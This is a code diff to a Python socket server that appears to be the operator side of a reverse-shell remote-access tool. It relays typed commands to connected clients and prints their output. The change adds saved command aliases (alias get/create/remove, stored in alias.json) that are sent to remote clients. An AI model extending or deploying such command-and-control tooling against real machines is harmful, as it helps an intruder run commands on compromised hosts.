@@ -1,4 +1,5 @@
 # coding=utf-8
+import json
 import os
 import socket
 import struct
@@ -38,6 +39,7 @@ class Server(object):
         self.socket = None
         self.connections = []
         self.addresses = []
+        self.aliases = {}
 
     def create_socket(self):
         try:
@@ -82,6 +84,8 @@ class Server(object):
                     lcd(cmd[3:])
                 elif cmd == 'ls':
                     lls()
+                elif cmd.split(' ')[0] == 'alias':
+                    self.handle_aliases(' '.join(cmd.strip().split()))
                 else:
                     print('[-] Command not recognized')
             except KeyboardInterrupt:
@@ -130,6 +134,10 @@ class Server(object):
                 cmd = input(recv(conn))
                 if not cmd:
                     send(conn, 'null')
+                elif cmd in self.aliases:
+                    print('[+] Sending command: ' + self.aliases[cmd])
+                    send(conn, self.aliases[cmd])
+                    print(recv_data(conn))
                 elif cmd in ['quit', 'exit']:
                     send(conn, 'null')
                     break
@@ -198,6 +206,58 @@ class Server(object):
                 os.system('')
                 print('\033[0;31m[-] Error: ' + str(exception) + '\033[0m')
                 continue
+
+    def handle_aliases(self, cmd):
+        args = cmd.split(' ')
+        if len(args) < 2:
+            print('[-] Not enough arguments')
+            return
+        command = cmd.split(' ')[0]
+        subcommand = cmd.split(' ')[1]
+        if subcommand == 'get':
+            print('----- Aliases -----')
+            for k, v in self.aliases.items():
+                print('{0:15}{1}'.format(k, v))
+            print()
+        elif subcommand == 'create':
+            if len(args) < 4:
+                print('[-] Not enough arguments')
+                return
+            alias = cmd.split(' ')[2]
+            self.aliases[alias] = cmd[len(command + subcommand + alias) + 3:]
+            self.save_aliases()
+            print('[+] Create alias success')
+        elif subcommand == 'remove':
+            if len(args) < 3:
+                print('[-] Not enough arguments')
+                return
+            alias = cmd[len(command + subcommand) + 2:]
+            if alias not in self.aliases:
+                print('[-] Alias does not exists')
+                return
+            del self.aliases[alias]
+            self.save_aliases()
+            print('[+] Remove alias success')
+        else:
+            print('[-] Invalid input')
+
+    def load_aliases(self):
+        try:
+            if os.path.isfile('alias.json'):
+                f = open('alias.json', 'r')
+                self.aliases = json.load(f)
+                f.close()
+        except Exception as exception:
+            print('[-] Load aliases error: ' + str(exception))
+
+    def save_aliases(self):
+        try:
+            alias_json = json.dumps(self.aliases)
+            f = open('alias.json', 'w')
+            f.write(alias_json)
+            f.close()
+        except Exception as exception:
+            print('[-] Save aliases error: ' + str(exception))
 
 
 def print_help():
@@ -309,6 +369,7 @@ def recv_file(conn, filename):
 
 
 server = Server()
+server.load_aliases()
 server.create_socket()
 threading.Thread(target=server.accept_connections, daemon=True).start()
 server.start_shell()
